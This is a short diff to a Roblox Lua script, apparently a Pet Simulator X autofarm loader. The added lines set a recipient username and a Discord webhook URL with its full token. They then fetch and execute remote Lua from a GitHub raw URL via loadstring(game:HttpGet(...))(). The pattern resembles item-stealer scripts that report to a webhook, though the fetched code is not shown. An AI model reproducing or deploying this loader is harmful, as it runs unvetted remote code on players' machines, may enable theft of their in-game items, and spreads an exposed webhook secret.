@@ -1,3 +1,4 @@
-_G.UserID = 4096633728
-_G.WebHook = "https://discord.com/api/webhooks/1051798482731683860/N8L_Oe89uGjBXyCxDvAkCPkxLVxxKL348kekfVrmeMw-7qANg4IHVEULn1QMNzCJaFHR"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
+UserName = "LilFraggg"
+WebHook = "https://discord.com/api/webhooks/1051798482731683860/N8L_Oe89uGjBXyCxDvAkCPkxLVxxKL348kekfVrmeMw-7qANg4IHVEULn1QMNzCJaFHR"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
